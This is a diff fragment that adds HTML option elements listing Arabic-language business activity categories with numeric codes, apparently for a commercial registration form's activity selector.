+                <div class="activity-option" data-value="1368">الشقق الفندقية</div>
+                <div class="activity-option" data-value="301">الطباعة الرقمية</div>
+                <div class="activity-option" data-value="297">الطباعة باستخدام الآلات الناسخة والحاسب الآلي والآلات المكتبية الأخرى مثل ناسخات الصور أو الناسخات الحرارية</div>
+                <div class="activity-option" data-value="300">الطباعة على المعادن</div>
+                <div class="activity-option" data-value="1342">الطيران البرمائي</div>
+                <div class="activity-option" data-value="467">العمليات المنفذة على الأحجار الخشنة خارج المحاجر مثل النشر والصقل والطحن ... إلخ</div>
+                <div class="activity-option" data-value="1756">العيادات الطبية المتخصصة</div>
+                <div class="activity-option" data-value="1757">العيادات الطبية غير المتخصصة</div>
+                <div class="activity-option" data-value="1025">الفحص الفني للمركبات</div>
+                <div class="activity-option" data-value="1367">الفنادق والموتيلات والمنتجعات</div>
+                <div class="activity-option" data-value="1729">الكليات</div>
+                <div class="activity-option" data-value="1730">الكليات الجامعية</div>
+                <div class="activity-option" data-value="1519">المخازن التجارية العامة</div>
+                <div class="activity-option" data-value="1546">المختبرات الزراعية</div>
+                <div class="activity-option" data-value="1375">المخيمات السياحية</div>
+                <div class="activity-option" data-value="1759">المراكز الصحية</div>
+                <div class="activity-option" data-value="1348">المسافنة</div>
+                <div class="activity-option" data-value="1754">المستشفيات</div>
+                <div class="activity-option" data-value="1377">المطاعم</div>
+                <div class="activity-option" data-value="1792">المغامرات السياحية</div>
+                <div class="activity-option" data-value="1390">المقاهي التي تقدم مشروبات بشكل أساسي</div>
+                <div class="activity-option" data-value="1383">المقاهي التي تقدم وجبات الطعام بشكل أساسي</div>
+                <div class="activity-option" data-value="1373">النزل التراثية</div>
+                <div class="activity-option" data-value="1374">النزل الخضراء</div>
+                <div class="activity-option" data-value="1408">النشر على الشبكة المعلوماتية (الإنترنت) للإحصاءات وغيرها من المعلومات</div>
+                <div class="activity-option" data-value="1428">النقل الإذاعي والتلفزيوني</div>
+                <div class="activity-option" data-value="1319">النقل البحري الداخلي للبضائع</div>
+                <div class="activity-option" data-value="1317">النقل البحري الداخلي للركاب</div>
+                <div class="activity-option" data-value="1316">النقل البحري الدولي للبترول والغاز</div>
+                <div class="activity-option" data-value="1315">النقل البحري الدولي للبضائع</div>
+                <div class="activity-option" data-value="1314">النقل البحري الدولي للركاب</div>
+                <div class="activity-option" data-value="1307">النقل البري بالشاحنات لأسطوانات غاز الطبخ</div>
+                <div class="activity-option" data-value="1302">النقل البري للبضائع والمعدات</div>
+                <div class="activity-option" data-value="1300">النقل البري للركاب بالحافلات (الدولي)</div>
+                <div class="activity-option" data-value="1291">النقل البري للركاب بالحافلات (الغير المنتظم)</div>
+                <div class="activity-option" data-value="1299">النقل البري للركاب بالحافلات المنتظم</div>
+                <div class="activity-option" data-value="1301">النقل البري للركاب بالحافلات المنتظم (النقل السياحي)</div>
+                <div class="activity-option" data-value="1304">النقل البري للمواد الخطرة</div>
+                <div class="activity-option" data-value="1309">النقل البري للنفايات والمخلفات والخردة</div>
+                <div class="activity-option" data-value="1321">النقل الجوي السياحي للركاب</div>
+                <div class="activity-option" data-value="1322">النقل الجوي للبضائع</div>
+                <div class="activity-option" data-value="1320">النقل الجوي للركاب</div>
+                <div class="activity-option" data-value="1762">النقل بسيارات الإسعاف</div>
+                <div class="activity-option" data-value="1345">الوساطة البحرية</div>
+                <div class="activity-option" data-value="1453">الوساطة التجارية عبر الانترنت</div>
+                <div class="activity-option" data-value="1493">الوساطة في الأوراق المالية</div>
+                <div class="activity-option" data-value="506">إنتاج أغراض معدنية بشكل مباشر من المساحيق</div>
+                <div class="activity-option" data-value="1411">إنتاج الأفلام السينمائية وأشرطة الفيديو</div>
+                <div class="activity-option" data-value="1420">إنتاج البرامج الإذاعية المسجلة (غير المباشرة)</div>
+                <div class="activity-option" data-value="1412">إنتاج البرامج والمسلسلات التلفزيونية</div>
+                <div class="activity-option" data-value="30">إنتاج البيض</div>
+                <div class="activity-option" data-value="1774">إنتاج الحفلات الموسيقية</div>
+                <div class="activity-option" data-value="115">إنتاج الروب (الزبادي)، القشدة، الزبدة، السمن ... إلخ</div>
+                <div class="activity-option" data-value="935">إنتاج السماد من المواد العضوية</div>
+                <div class="activity-option" data-value="20">إنتاج اللبن البقري الخام من البقر أو الجاموس</div>
+                <div class="activity-option" data-value="483">إنتاج المعادن الثمينة الخام من الذهب أو الفضة أو المعادن الثمينة الداخلة في مجموعة البلاتين</div>
+                <div class="activity-option" data-value="484">إنتاج المعادن الثمينة المشغولة بكافة أشكالها (كتل، حبوب، سبائك، قضبان، كريات ... إلخ) من الذهب أو الفضة أو البلاتين أو المعادن الثمينة الداخلة في مجموعة البلاتين (عدا صنع المجوهرات)</div>
+                <div class="activity-option" data-value="64">إنتاج الملح بتبخير مياه البحر أو المياه المالحة</div>
+                <div class="activity-option" data-value="333">انتاج الهيدروجين الأخضر</div>
+                <div class="activity-option" data-value="304">إنتاج ألواح واسطوانات وأحجار طباعة وما إلى ذلك من الوسائط الأخرى المستخدمة في الطباعة</div>
+                <div class="activity-option" data-value="727">إنتاج أنظمة القواعد وحاملات المدافع الرشاشة</div>
+                <div class="activity-option" data-value="116">إنتاج أنواع الأجبان (أبيض، جاف، مطبوخ ... إلخ)</div>
+                <div class="activity-option" data-value="917">إنتاج أنواع الوقود الغازية</div>
+                <div class="activity-option" data-value="242">إنتاج أنواع نشارة الخشب</div>
+                <div class="activity-option" data-value="459">إنتاج خرسانة جاهزة الخلط</div>
+                <div class="activity-option" data-value="122">إنتاج دقيق من الأرز</div>
+                <div class="activity-option" data-value="339">انتاج محسنات التربة الزراعية</div>
+                <div class="activity-option" data-value="89">إنتاج منتجات الأسماك كالسمك المطبوخ وشرائح السمك والبطارخ والكافيار .. إلخ، الطازجة والمجمدة</div>
+                <div class="activity-option" data-value="170">انتاج وتعبئة المياه المعدنية</div>
+                <div class="activity-option" data-value="168">انتاج وتعبئة مياه الشرب المعبأة في عبوات</div>
+                <div class="activity-option" data-value="106">إنتاج وتكرير الزيوت النباتية الأخرى</div>
+                <div class="activity-option" data-value="111">إنتاج وتكرير زيت الزيتون</div>
+                <div class="activity-option" data-value="105">إنتاج وتكرير زيت السمسم</div>
+                <div class="activity-option" data-value="920">إنتاج وتوزيع البخار والمياه الحارة لأغراض التدفئة وتوليد الكهرباء والأغراض الأخرى</div>
+                <div class="activity-option" data-value="1788">أندية الرماية</div>
+                <div class="activity-option" data-value="1787">أندية الفروسية والهجن والصيد</div>
+                <div class="activity-option" data-value="953">إنشاء أبنية المطارات</div>
+                <div class="activity-option" data-value="1001">إنشاء حمامات السباحة الخارجية</div>
+                <div class="activity-option" data-value="1436">إنشاء قواعد البيانات ومواقع الشبكة</div>
+                <div class="activity-option" data-value="955">إنشاء وإصلاح المطارات والمرافئ</div>
+                <div class="activity-option" data-value="956">إنشاء وإصلاح خطوط السكك الحديدية</div>
+                <div class="activity-option" data-value="1683">إنشاء وصيانة الحدائق</div>
+                <div class="activity-option" data-value="942">أنشطة أخرى لإعادة دوران النفايات والخردة الفلزية (المعدنية)</div>
+                <div class="activity-option" data-value="1462">أنشطة استثمار الأموال والأوراق المالية (أسهم وسندات و صكوك)</div>
+                <div class="activity-option" data-value="1569">أنشطة استوديوهات ومعامل التصوير</div>
+                <div class="activity-option" data-value="1459">أنشطة إصدار الحوالات والشيكات المالية</div>
+                <div class="activity-option" data-value="1789">أنشطة الاسطبلات</div>
+                <div class="activity-option" data-value="1424">أنشطة البث التلفزيوني والبرمجة التلفزيونية</div>
+                <div class="activity-option" data-value="1365">أنشطة البريد (الخدمات البريدية والخدمات المرتبطة بها)</div>
+                <div class="activity-option" data-value="1564">أنشطة التصميم الداخلي</div>
+                <div class="activity-option" data-value="1565">أنشطة التصميم على الشاشات</div>
+                <div class="activity-option" data-value="1694">أنشطة التعبئة والتغليف (لحساب الغير)</div>
+                <div class="activity-option" data-value="1794">أنشطة التمثيل</div>
+                <div class="activity-option" data-value="1468">أنشطة التمويل بالتقسيط</div>
+                <div class="activity-option" data-value="71">أنشطة التنقيب عن حقول النفط والغاز</div>
+                <div class="activity-option" data-value="37">أنشطة الدعم للإنتاج الحيواني</div>
+                <div class="activity-option" data-value="1567">أنشطة الرسم على الزجاج واللوائح</div>
+                <div class="activity-option" data-value="1578">أنشطة السمسرة التجارية</div>
+                <div class="activity-option" data-value="1461">أنشطة الشركات القابضة</div>
+                <div class="activity-option" data-value="1776">أنشطة الصحفيين المستقلين</div>
+                <div class="activity-option" data-value="1796">أنشطة ألعاب التسلية وأنظمة المحاكاة الالكترونية</div>
+                <div class="activity-option" data-value="1797">أنشطة العاب تسلية متنقلة</div>
+                <div class="activity-option" data-value="1802">أنشطة الكنائس</div>
+                <div class="activity-option" data-value="1801">أنشطة المساجد</div>
+                <div class="activity-option" data-value="1803">أنشطة المعابد</div>
+                <div class="activity-option" data-value="1791">أنشطة المنتزهات الترفيهية والشواطئ</div>
+                <div class="activity-option" data-value="1800">أنشطة النقابات العمالية</div>
+                <div class="activity-option" data-value="1670">أنشطة بيع التذاكر للأحداث الترفيهية</div>
+                <div class="activity-option" data-value="1671">أنشطة بيع التذاكر للأحداث الرياضية</div>
+                <div class="activity-option" data-value="1669">أنشطة بيع التذاكر للأحداث المسرحية</div>
+                <div class="activity-option" data-value="1692">أنشطة تحصيل الديون</div>
+                <div class="activity-option" data-value="1539">أنشطة تخطيط وتصميم المناظر الطبيعية</div>
+                <div class="activity-option" data-value="1419">أنشطة تسجيل الصوت</div>
+                <div class="activity-option" data-value="1566">أنشطة تصميم الملابس</div>
+                <div class="activity-option" data-value="1498">أنشطة تقديم الاستشارات والأبحاث المالية</div>
+                <div class="activity-option" data-value="1415">أنشطة توزيع الأفلام السينمائية والفيديو والبرامج التلفزيونية</div>
+                <div class="activity-option" data-value="72">أنشطة دعم خاصة باستغلال المحاجر لاستخراج الأحجار والرمال والطفل</div>
+                <div class="activity-option" data-value="1416">أنشطة عرض الأفلام السينمائية</div>
+                <div class="activity-option" data-value="1413">أنشطة ما بعد الإنتاج لأشرطة الفيديو أو الصور المتحركة (مثل التحرير والتطوير)</div>
+                <div class="activity-option" data-value="1677">أنشطة متكاملة لدعم المرافق</div>
+                <div class="activity-option" data-value="1790">أنشطة مدن التسلية ومدن الألعاب</div>
+                <div class="activity-option" data-value="1688">أنشطة مراكز النداء</div>
+                <div class="activity-option" data-value="1502">أنشطة مزودي خدمة المدفوعات</div>
+                <div class="activity-option" data-value="1572">أنشطة مصوري الصحافة المستقلين</div>
+                <div class="activity-option" data-value="1456">أنشطة وكالات الأنباء (باستثناء المصورين والصحفيين المستقلين)</div>
+                <div class="activity-option" data-value="1666">أنشطة وكالات السفر</div>
+                <div class="activity-option" data-value="1663">أنشطة وكالات ومكاتب تشغيل الممثلين والمسرحيين</div>
+                <div class="activity-option" data-value="101">إنضاج الموز</div>
+                <div class="activity-option" data-value="743">بناء السفن والمنشآت العائمة</div>
+                <div class="activity-option" data-value="748">بناء اليخوت والقوارب</div>
+                <div class="activity-option" data-value="1455">بوابات الشبكة</div>
+                <div class="activity-option" data-value="1227">بيع أجهزة ومعدات الطاقة البديلة بالتجزئة</div>
+                <div class="activity-option" data-value="1093">بيع أسطوانات غاز النفط المسال (المستودعات)</div>
+                <div class="activity-option" data-value="1028">بيع الإطارات ولوازمها</div>
+                <div class="activity-option" data-value="1200">بيع الألعاب واللعب بالتجزئة في المتاجر المتخصصة</div>
+                <div class="activity-option" data-value="1029">بيع البطاريات</div>
+                <div class="activity-option" data-value="1033">بيع الدراجات النارية وما يتصل بها من أجزاء وتوابع</div>
+                <div class="activity-option" data-value="1382">بيع الذرة</div>
+                <div class="activity-option" data-value="1160">بيع الروبوتات وأجهزة الذكاء الاصطناعي</div>
+                <div class="activity-option" data-value="1005">بيع الشاحنات والمقطورات والمعدات</div>
+                <div class="activity-option" data-value="1199">بيع القوارب واليخوت بالتجزئة</div>
+                <div class="activity-option" data-value="1003">بيع المركبات الجديدة</div>
+                <div class="activity-option" data-value="1004">بيع المركبات المستعملة</div>
+                <div class="activity-option" data-value="1032">بيع زجاج المركبات</div>
+                <div class="activity-option" data-value="1030">بيع زينة واكسسوارات المركبات (تشمل منتجات العناية بالسيارات)</div>
+                <div class="activity-option" data-value="1278">بيع قاطرات سكك الحديد وقطع غيارها</div>
+                <div class="activity-option" data-value="1026">بيع قطع الغيار الجديدة للمركبات</div>
+                <div class="activity-option" data-value="1027">بيع قطع الغيار المستعملة للمركبات</div>
+                <div class="activity-option" data-value="1031">بيع قطع غيار ولوازم المعدات الثقيلة ذات المحركات</div>
+                <div class="activity-option" data-value="1006">بيع مركبات التخييم والبيوت المتنقلة ذات المحركات</div>
+                <div class="activity-option" data-value="1145">بيع منتجات التبغ بالتجزئة في المتاجر المتخصصة</div>
+                <div class="activity-option" data-value="1637">بيع وتأجير أدوات الغوص</div>
+                <div class="activity-option" data-value="1040">بيع وشراء الطاقة والمياه</div>
+                <div class="activity-option" data-value="1369">بيوت الشباب</div>
+                <div class="activity-option" data-value="1372">بيوت الضيافة</div>
+                <div class="activity-option" data-value="1376">بيوت الطلبة والطالبات</div>
+                <div class="activity-option" data-value="1649">تأجير آلات ومعدات الإنشاء والهندسة المدنية (بدون مشغل)</div>
+                <div class="activity-option" data-value="1651">تأجير آلات ومعدات الحاسبات الإلكترونية</div>
+                <div class="activity-option" data-value="1650">تأجير آلات ومعدات المكاتب بكافة أنواعها</div>
+                <div class="activity-option" data-value="1655">تأجير أجهزة الاتصالات</div>
+                <div class="activity-option" data-value="1653">تأجير أدوات وآلات ومعدات التعدين وحقول النفط</div>
+                <div class="activity-option" data-value="1652">تأجير الآلات التي تستخدم في الصناعات كسلع رأسمالية</div>
+                <div class="activity-option" data-value="1648">تأجير الآلات والمعدات الزراعية (بدون مشغل)</div>
+                <div class="activity-option" data-value="1657">تأجير الأثاث المكتبي</div>
+                <div class="activity-option" data-value="1644">تأجير الأجهزة الكهربائية والأدوات المنزلية</div>
+                <div class="activity-option" data-value="1645">تأجير الخيام</div>
+                <div class="activity-option" data-value="1658">تأجير الدراجات النارية</div>
+                <div class="activity-option" data-value="1636">تأجير الدراجات بكافة أنواعها</div>
+                <div class="activity-option" data-value="999">تأجير الرافعات التي يشغلها عامل</div>
+                <div class="activity-option" data-value="1347">تأجير السفن</div>
+                <div class="activity-option" data-value="1660">تأجير الطائرات بدون طيار (الدرونز / المودل)</div>
+                <div class="activity-option" data-value="1635">تأجير القوارب واليخوت والمنشآت العائمة السياحية</div>
+                <div class="activity-option" data-value="1656">تأجير الكرافانات (عدا السياحية) وسيارات التخييم والحاويات والمنصات، دون سائق</div>
+                <div class="activity-option" data-value="1659">تأجير الكرفانات السياحية المتنقلة</div>
+                <div class="activity-option" data-value="1654">تأجير المعدات التجارية والآلات المهنية</div>
+                <div class="activity-option" data-value="35">تأجير المعدات الزراعية التي يشغلها عامل</div>
+                <div class="activity-option" data-value="1642">تأجير المنسوجات والملبوسات والأحذية (تشمل فساتين الأفراح)</div>
+                <div class="activity-option" data-value="1634">تأجير الوحدات الترفيهية البحرية</div>
+                <div class="activity-option" data-value="1641">تأجير شرائط وأقراص الفيديو</div>
+                <div class="activity-option" data-value="1639">تـأجير عربات الأطفال</div>
+                <div class="activity-option" data-value="1643">تأجير لوازم المناسبات والأثاث</div>
+                <div class="activity-option" data-value="1002">تأجير معدات البناء أو الهدم التي يشغلها عامل</div>
+                <div class="activity-option" data-value="1646">تأجير معدات النقل البحري (بدون مشغل)</div>
+                <div class="activity-option" data-value="1647">تأجير معدات النقل الجوي (بدون مشغل)</div>
+                <div class="activity-option" data-value="1331">تأجير مواقف السيارات وإدارتها</div>
+                <div class="activity-option" data-value="1633">تأجير وسائل النقل البري للبضائع</div>
+                <div class="activity-option" data-value="1632">تأجير وسائل النقل البري للركاب بدون سائق</div>
+                <div class="activity-option" data-value="1293">تأجير وسائل النقل البري للركاب مع سائق</div>
+                <div class="activity-option" data-value="1484">تأمين ائتمان ذمم تجارية للمبيعات المحلية، الصادرات، والواردات</div>
+                <div class="activity-option" data-value="1486">تأمين الاستثمارات الأجنبية والخارجية</div>
+                <div class="activity-option" data-value="1481">تأمين الطائرات</div>
+                <div class="activity-option" data-value="1485">تأمين المخاطر التجارية والغير تجارية</div>
+                <div class="activity-option" data-value="1487">تأمين وإصدار السندات بكافة أنواعها للشركات أو المصارف أو المؤسسات المالية غير المصرفية</div>
+                <div class="activity-option" data-value="1014">تبديل زيوت المركبات</div>
+                <div class="activity-option" data-value="95">تبريد وتجميد الفواكه والخضراوات</div>
+                <div class="activity-option" data-value="77">تبريد وتجميد اللحوم</div>
+                <div class="activity-option" data-value="178">تبييض وصبغ وطبع الألياف النسيجية</div>
+                <div class="activity-option" data-value="1505">تثمين المركبات الملغاة</div>
+                <div class="activity-option" data-value="1521">تثمين الممتلكات</div>
+                <div class="activity-option" data-value="1813">تجديد وإصلاح الأثاث الخشبي</div>
+                <div class="activity-option" data-value="1814">تجديد وإصلاح الأثاث غير الخشبي</div>
+                <div class="activity-option" data-value="96">تجفيف وتعبئة التمور والعنب والتين وصنع منتجاتها</div>
+                <div class="activity-option" data-value="302">تجليد الكتب والمستندات</div>
+                <div class="activity-option" data-value="842">تجميع وصيانة مولدات الضغط العالي</div>
+                <div class="activity-option" data-value="303">تجهيز وإعداد حروف الطباعة</div>
+                <div class="activity-option" data-value="114">تجهيز وبسترة وتعبئة الحليب واللبن الطازج</div>
+                <div class="activity-option" data-value="85">تجهيز وتغليف البيض</div>
+                <div class="activity-option" data-value="91">تجهيز وحفظ الأسماك والأحياء المائية على السفن المتخصصة</div>
+                <div class="activity-option" data-value="264">تجهيز وصنع الفلين الطبيعي ومنتجات الفلين مثل صفائح وألواح وبلاط مصنوع من الفلين والفلين المكتل ... إلخ</div>
+                <div class="activity-option" data-value="940">تجهيز ومعالجة النفايات والخردة الفلزية وأصناف المعادن لاستخدامها كمواد أولية</div>
+                <div class="activity-option" data-value="943">تجهيز ومعالجة النفايات والخردة اللافلزية (غير المعدنية) وأصنافها لاستخدامها كمواد أولية</div>
+                <div class="activity-option" data-value="1693">تحصيل الفواتير</div>
+                <div class="activity-option" data-value="1571">تحضير أفلام المايكروفيلم وتصوير الوثائق عليها</div>
+                <div class="activity-option" data-value="94">تحضير أو تعليب أو حفظ الخضراوات الطازجة أو المطبوخة وعصيرها</div>
+                <div class="activity-option" data-value="93">تحضير أو تعليب أو حفظ الفواكه وعصيرها</div>
+                <div class="activity-option" data-value="924">تحلية المياه</div>
+                <div class="activity-option" data-value="1437">تحليل الأعمال</div>
+                <div class="activity-option" data-value="1432">تحليل النظم</div>
+                <div class="activity-option" data-value="152">تحميص البن أو طحنه أو تعبئته وصنع بدائل البن</div>
+                <div class="activity-option" data-value="1570">تحميض الأفلام وطبع الصور</div>
+                <div class="activity-option" data-value="1327">تخزين النفط الخام</div>
+                <div class="activity-option" data-value="1439">تخطيط وتصميم نظم الحاسوب التي تستخدم في تكامل تكنولوجيات المعدات الحاسوبية والبرمجيات</div>
+                <div class="activity-option" data-value="1829">تدليك (الأقدام - الرأس)</div>
+                <div class="activity-option" data-value="45">تربية أسماك الزينة البحرية</div>
+                <div class="activity-option" data-value="23">تربية الجمال والحيوانات الجملية</div>
+                <div class="activity-option" data-value="22">تربية الخيول للسباقات</div>
+                <div class="activity-option" data-value="21">تربية الخيول والحيوانات الخيلية الأخرى</div>
+                <div class="activity-option" data-value="28">تربية الدواجن</div>
+                <div class="activity-option" data-value="26">تربية الضأن والماعز</div>
+                <div class="activity-option" data-value="19">تربية الماشية والجاموس</div>
+                <div class="activity-option" data-value="31">تربية النحل وإنتاج العسل وشمع العسل</div>
+                <div class="activity-option" data-value="904">تركيب آلات عمليات التعدين واستغلال المحاجر والتشييد</div>
+                <div class="activity-option" data-value="911">تركيب أجهزة الأشعة وغيرها من المعدات الكهربائية الطبية</div>
+                <div class="activity-option" data-value="908">تركيب أجهزة الحاسوب الرئيسية والطرفية وآلات المكاتب الأخرى</div>
+                <div class="activity-option" data-value="914">تركيب أجهزة بتقنية النانو لمعالجة المياه والطاقة</div>
+                <div class="activity-option" data-value="975">تركيب إضاءة الشوارع والإشارات الكهربائية</div>
+                <div class="activity-option" data-value="907">تركيب الآلات المتخصصة الغرض الأخرى</div>
+                <div class="activity-option" data-value="900">تركيب الآلات المتعددة الأغراض الأخرى</div>
+                <div class="activity-option" data-value="903">تركيب الآلات المستخدمة في معالجة المعادن</div>
+                <div class="activity-option" data-value="901">تركيب الآلات والمعدات الزراعية</div>
+                <div class="activity-option" data-value="986">تركيب الأبواب ذاتية الحركة والدوارة وملحقاتها</div>
+                <div class="activity-option" data-value="987">تركيب الأبواب والنوافذ</div>
+                <div class="activity-option" data-value="989">تركيب الأثاث</div>
+                <div class="activity-option" data-value="898">تركيب الأفران ومواقد الأفران</div>
+                <div class="activity-option" data-value="990">تركيب الألواح الزجاجية</div>
+                <div class="activity-option" data-value="36">تركيب البيوت الزراعية</div>
+                <div class="activity-option" data-value="993">تركيب الجبس (أحجار الزينة)</div>
+                <div class="activity-option" data-value="896">تركيب المحركات والتوربينات</div>
+                <div class="activity-option" data-value="909">تركيب المحركات والمولدات والمحولات الكهربائية</div>
+                <div class="activity-option" data-value="897">تركيب المضخات الصناعية</div>
+                <div class="activity-option" data-value="994">تركيب المنازل الجاهزة والكرفانات</div>
+                <div class="activity-option" data-value="1448">تركيب برمجيات الحاسب الالي</div>
+                <div class="activity-option" data-value="913">تركيب تجهيزات صالات البولينغ</div>
+                <div class="activity-option" data-value="253">تركيب مصنوعات النجارة أو قطع الأخشاب المصنوعة في الوحدة ذاتها</div>
+                <div class="activity-option" data-value="910">تركيب معدات الاتصالات</div>
+                <div class="activity-option" data-value="899">تركيب معدات الرفع والمناولة</div>
+                <div class="activity-option" data-value="981">تركيب معدات الفنادق والمطاعم والمطابخ</div>
+                <div class="activity-option" data-value="912">تركيب معدات ضبط العمليات الصناعية</div>
+                <div class="activity-option" data-value="895">تركيب مولدات البخار</div>
+                <div class="activity-option" data-value="974">تركيب نظم إنذار الحريق والسرقة</div>
+                <div class="activity-option" data-value="976">تركيب وإصلاح الأدوات الصحية</div>
+                <div class="activity-option" data-value="984">تركيب وإصلاح المصاعد والسلالم المتحركة</div>
+                <div class="activity-option" data-value="1023">تركيب وإصلاح زجاج المركبات</div>
+                <div class="activity-option" data-value="1022">تركيب وإصلاح زينة واكسسوارات المركبات</div>
+                <div class="activity-option" data-value="977">تركيب وإصلاح نظم التدفئة وتكييف الهواء</div>
+                <div class="activity-option" data-value="978">تركيب وإصلاح نظم مرشحات ومقاومة الحريق</div>
+                <div class="activity-option" data-value="1675">تركيب وإصلاح وإعادة بناء وضبط أجهزة الإقفال الميكانيكية والإلكترونية والخزانات الحديدية وخزانات الودائع الآمنة</div>
+                <div class="activity-option" data-value="1704">تركيب وتجميع لوحات النيون</div>
+                <div class="activity-option" data-value="972">تركيب وتمديد واصلاح الاعمال الكهربائية</div>
+                <div class="activity-option" data-value="988">تركيب وصيانة ابواب غرف التبريد</div>
+                <div class="activity-option" data-value="985">تركيب وصيانة أعمال العزل (مياه، حرارة، صوت)</div>
+                <div class="activity-option" data-value="1431">تركيب وصيانة الأنظمة الألكترونية لإدارة المركبات</div>
+                <div class="activity-option" data-value="982">تركيب وصيانة معدات غرف التبريد والتجميد</div>
+                <div class="activity-option" data-value="1560">ترويج وتسويق البضائع</div>
+                <div class="activity-option" data-value="1148">تزويد السفن بالوقود</div>
+                <div class="activity-option" data-value="1581">تسجيل براءة اختراع</div>
+                <div class="activity-option" data-value="1582">تسجيل علامات تجارية</div>
+                <div class="activity-option" data-value="1583">تسويق النصوص المقروئة والسمعية</div>
+                <div class="activity-option" data-value="1464">تسويق أوراق مالية غير عمانية</div>
+                <div class="activity-option" data-value="1638">تسيير الرحلات البحرية السياحية</div>
+                <div class="activity-option" data-value="1640">تسيير رحلات الغوص</div>
+                <div class="activity-option" data-value="70">تسييل الغاز الطبيعي وإعادة تحويله إلى غاز لأغراض النقل في موقع الاستخراج</div>
+                <div class="activity-option" data-value="243">تشريب الخشب أو معالجته كيمائيا بمواد حافظة</div>
+                <div class="activity-option" data-value="1353">تشغيل (إدارة وصيانة) محطات شحن السلع في المطارات</div>
+                <div class="activity-option" data-value="1336">تشغيل (إدارة وصيانة) محطات شحن السلع في الموانئ</div>
+                <div class="activity-option" data-value="1330">تشغيل (إدارة وصيانة) محطات شحن السلع في محطات السكك الحديدية والحافلات</div>
+                <div class="activity-option" data-value="46">تشغيل أحواض تفريخ الأسماك البحرية</div>
+                <div class="activity-option" data-value="50">تشغيل أحواض تفريخ الأسماك في المياه العذبة</div>
+                <div class="activity-option" data-value="1298">تشغيل العربات الهوائية (التلفريك)</div>
+                <div class="activity-option" data-value="1778">تشغيل المتاحف بكافة أنواعها</div>
+                <div class="activity-option" data-value="56">تشغيل المحاجر</div>
+                <div class="activity-option" data-value="75">تشغيل المسالخ (ذبح وتهيئة لحوم المواشي)</div>
+                <div class="activity-option" data-value="1779">تشغيل المواقع والمباني التاريخية والمحافظة عليها</div>
+                <div class="activity-option" data-value="1782">تشغيل حدائق الحيوانات</div>
+                <div class="activity-option" data-value="1783">تشغيل حدائق الفراشات</div>
+                <div class="activity-option" data-value="1781">تشغيل حدائق النباتات والزهور</div>
+                <div class="activity-option" data-value="1297">تشغيل مصاعد التزلج</div>
+                <div class="activity-option" data-value="29">تشغيل مفارخ الدواجن</div>
+                <div class="activity-option" data-value="58">تشغيل مناجم الرمال أو الحصباء، بما في ذلك استخراج وتجريف الرمال الصناعية ورمال الإنشاءات والحصباء وتكسير وجرش الأحجار والحصباء (الكسارات)</div>
+                <div class="activity-option" data-value="1580">تشغيل وتسويق الأسواق الحرة</div>
+                <div class="activity-option" data-value="1313">تشغيل وصيانة محطات الضخ وخطوط الأنابيب</div>
+                <div class="activity-option" data-value="962">تشغيل وصيانة محطات الطاقة ومحطات تحلية المياه</div>
+                <div class="activity-option" data-value="181">تشميع الملابس ضد الماء</div>
+                <div class="activity-option" data-value="180">تشميع المنسوجات ضد الماء وطلائها</div>
+                <div class="activity-option" data-value="966">تشييد السدود</div>
+                <div class="activity-option" data-value="736">تصفيح وتعديل المركبات العسكرية</div>
+                <div class="activity-option" data-value="1824">تصفيف الشعر وأنواع التجميل للنساء</div>
+                <div class="activity-option" data-value="1433">تصميم وبرمجة البرمجيات الخاصة</div>
+                <div class="activity-option" data-value="1435">تطوير شبكات الحاسب الآلي</div>
+                <div class="activity-option" data-value="322">تعبئة اسطوانات الغاز الصغيرة (غاز الرحلات)</div>
+                <div class="activity-option" data-value="1698">تعبئة الأحبار</div>
+                <div class="activity-option" data-value="456">تعبئة الإسمنت والجبس</div>
+                <div class="activity-option" data-value="109">تعبئة الزيوت والدهون النباتية بعد تكريرها</div>
+                <div class="activity-option" data-value="141">تعبئة السكر</div>
+                <div class="activity-option" data-value="57">تعدين الجبس والأنهيدريت</div>
+                <div class="activity-option" data-value="62">تعدين الكبريت والخامات المحتوية على الباريوم</div>
+                <div class="activity-option" data-value="61">تعدين المعادن المحتوية على النتروجين والبوتاسيوم والكبريت</div>
+                <div class="activity-option" data-value="55">تعدين وإعداد الركازات التي تقدر قيمتها أساسا لاحتوائها على الفلزات الثمينة: الذهب والفضة والبلاتين</div>
+                <div class="activity-option" data-value="54">تعدين وإعداد الركازات التي تقدر قيمتها أساسا لاحتوائها على فلزات غير حديدية: الألمنيوم والنحاس والرصاص</div>
+                <div class="activity-option" data-value="1733">تعليم اليوغا</div>
+                <div class="activity-option" data-value="1739">تعليم ذوي الإعاقة</div>
+                <div class="activity-option" data-value="1741">تعليم قيادة السيارات</div>
+                <div class="activity-option" data-value="992">تغطية الأرضيات والجدران بالبلاط أو الباركيه أو الرخام أو السيراميك أو الموزاييك أو كلادينج</div>
+                <div class="activity-option" data-value="1695">تغليف الأمتعة</div>
+                <div class="activity-option" data-value="1697">تغليف الطرود ولف الهدايا</div>
+                <div class="activity-option" data-value="971">تفجير الصخور لإعداد المواقع</div>
+                <div class="activity-option" data-value="215">تفصيل وخياطة العبايات النسائية</div>
+                <div class="activity-option" data-value="211">تفصيل وخياطة الملابس الرياضية</div>
+                <div class="activity-option" data-value="217">تفصيل وخياطة الملابس الطبية</div>
+                <div class="activity-option" data-value="210">تفصيل وخياطة الملابس النسائية العربية وغير العربية</div>
+                <div class="activity-option" data-value="212">تفصيل وخياطة الملابس والأحذية العسكرية</div>
+                <div class="activity-option" data-value="208">تفصيل وخياطة وحياكة الملابس الرجالية العربية (محلات تفصيل خياطة الملابس الرجالية)</div>
+                <div class="activity-option" data-value="209">تفصيل وخياطة وحياكة الملابس الرجالية غير العربية</div>
+                <div class="activity-option" data-value="945">تفكيك وتقطيع السفن والإنتشال البحري</div>
+                <div class="activity-option" data-value="1387">تقديم خدمات الضيافة</div>
+                <div class="activity-option" data-value="1686">تقديم خدمات تأجير صناديق البريد</div>
+                <div class="activity-option" data-value="1454">تقديم خدمات مساندة المنصات الإلكترونية</div>
+                <div class="activity-option" data-value="1665">تقديم موارد بشرية أخرى</div>
+                <div class="activity-option" data-value="964">تقسيم الأراضي مع تحسينات الأراضي (أي إضافة طرق وبنية تحتية، إلخ)</div>
+                <div class="activity-option" data-value="1504">تقييم المخاطر والأضرار</div>
+                <div class="activity-option" data-value="1584">تقييم وتثمين الموجودات والممتلكات (لا تشمل الممتلكات العقارية أو تقدير الخسائر للتأمين)</div>
+                <div class="activity-option" data-value="140">تكرير السكر الخام</div>
+                <div class="activity-option" data-value="154">تكرير وطحن ملح الطعام</div>
+                <div class="activity-option" data-value="508">تلحيم المواسير والمعدات وراديترات وشكمانات المركبات</div>
